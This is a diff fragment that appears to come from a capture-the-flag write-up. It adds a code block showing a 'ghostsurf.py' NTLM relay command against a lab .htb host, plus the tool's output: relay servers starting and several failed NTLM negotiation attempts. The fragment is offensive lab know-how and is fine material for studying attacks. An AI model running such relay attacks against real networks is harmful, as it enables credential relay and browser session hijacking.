@@ -461,6 +461,50 @@ b'<!DOCTYPE html>\n<html lang="en">\n\n<head>\n    <meta charset="utf-8" />\n   
 > 
 > Blog: [ghostsurf: From NTLM Relay to Browser Session Hijacking](https://specterops.io/blog/2026/04/02/ghostsurf-from-ntlm-relay-to-browser-session-hijacking/)
 
+```
+python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb --keep-relaying --kernel-auth --http-port 8888
+
+  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
+.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
+|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
+\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
+ \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
+ )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
+(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)
+
+
+[*] Target: http://gpz-op26-secure.ghostlink.htb
+[*] SOCKS proxy started. Listening on 127.0.0.1:1080
+[*] HTTP Socks Plugin loaded..
+[*] HTTPS Socks Plugin loaded..
+[*] SOCKS proxy: 127.0.0.1:1080
+[*] Kernel-mode auth workaround ENABLED
+[*] Keep-relaying mode ENABLED (will reload targets after success)
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 8888
+ * Serving Flask app 'lib.relay.servers.socksserver'
+ * Debug mode: off
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+ghostsurf> [*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
+[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
+[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.190.87 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[-] (HTTP): Exception while Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb: "'NTLMRelayxConfig' object has no attribute 'remove_target'"
+[-] (HTTP): Negotiating NTLM with http://gpz-op26-secure.ghostlink.htb failed
+```
 
 ---
 ## Foothold
